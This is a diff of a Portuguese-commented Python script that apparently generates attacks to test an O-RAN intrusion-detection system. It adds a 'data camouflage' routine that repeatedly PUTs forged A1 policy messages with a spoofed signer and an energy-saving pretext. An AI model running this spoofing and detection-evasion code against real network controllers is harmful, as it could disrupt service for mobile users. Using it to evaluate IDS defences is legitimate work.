@@ -39,7 +39,6 @@ REF_USERS_STD = 10
 # ============================================================
 # TECNICA 1: ADVERSARIAL NOISE (xApp)
 # ============================================================
-
 def tecnica1_adversarial_noise():
     """Ruido adversarial FGSM-like contra classificador ML do xApp"""
     step = 0
@@ -75,7 +74,6 @@ def tecnica1_adversarial_noise():
 # ============================================================
 # TECNICA 2: GRADIENT MASKING (xApp)
 # ============================================================
-
 def tecnica2_gradient_masking():
     """Engana detecção baseada em gradiente - 70% normal, 30% sutil"""
     time.sleep(5)
@@ -117,4 +115,38 @@ def tecnica2_gradient_masking():
 
 # ============================================================
 # TECNICA 3: DATA CAMOUFLAGE (rApp)
+# ============================================================
+def tecnica3_data_camouflage():
+    """Políticas maliciosas com aparencia de mensagens A1 legitimas"""
+    time.sleep(8)
+    toggle = False
+    while True:
+        try:
+            toggle = not toggle
+
+            ataque = {
+                "type": "A1_POLICY",
+                "scope": "UE_GROUP_1",
+                "value": toggle,
+                "reason": "ENERGY_SAVING_SCHEDULED",
+                "schedule_id": f"sched-{random.randint(1000, 9999)}",
+                "priority": random.choice(["low", "medium"]),
+                "ttl_seconds": random.randint(60, 300),
+                "signed_by": "rapp-legitimo-01",
+                "nonce": random.randint(100000, 999999)
+            }
+
+            data = json.dumps(ataque).encode()
+            req = urllib.request.Request(BASE_URL, data=data, method="PUT")
+            req.add_header('Content-Type', 'application/json')
+            with urllib.request.urlopen(req, timeout=2): 
+                pass
+
+            time.sleep(random.choice([1.5, 2.0, 2.5, 3.0, 3.5, 4.0, 5.0]))
+        except Exception as e:
+            print(f"[IDS-T3:Camouflage] Erro: {e}")
+            time.sleep(2)
+
+# ============================================================
+# TECNICA 4: TIME DRIFTING (xApp + rApp)
 # ============================================================
